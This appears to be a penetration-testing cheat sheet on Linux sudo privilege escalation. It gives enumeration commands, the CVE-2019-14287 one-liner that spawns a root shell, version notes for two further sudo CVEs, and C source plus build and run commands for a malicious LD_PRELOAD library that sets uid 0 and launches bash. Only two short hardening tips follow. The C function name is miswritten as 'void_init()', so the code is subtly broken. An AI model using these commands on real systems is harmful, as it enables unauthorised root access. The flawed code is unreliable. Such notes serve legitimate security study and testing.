Permissions with SUDO
```bash
sudo -l 
cat /etc/sudoers
```
Audit CVE-2019-14287, sudo < v1.8.28
```bash
sudo -u#-1 /bin/bash
```
Audit CVE-2019-18634
- sudo < `1.8.26`, pwfeedback option in /etc/sudoers
Audit CVE-2021-3156
- < `1.8.31 Ubuntu 20.04`
- < `1.8.27 Debian 10`
- < `1.9.2 Fedora 33`
### LD_PRELOAD
Optional environment variable in `sudo -l`, allows executing a library before binary.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void_init() { 
	unsetenv("LD_PRELOAD");
	setgid(0); 
	setuid(0); 
	system("/bin/bash"); 
}
```
Executing malicious library
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=<PATH_TO_LIBRARY> apache2
```
### Protections
1. Always provide absolute path for binaries listed in /etc/sudoers.
2. Grant sudo rights sparingly to users, follow principle of least privilege.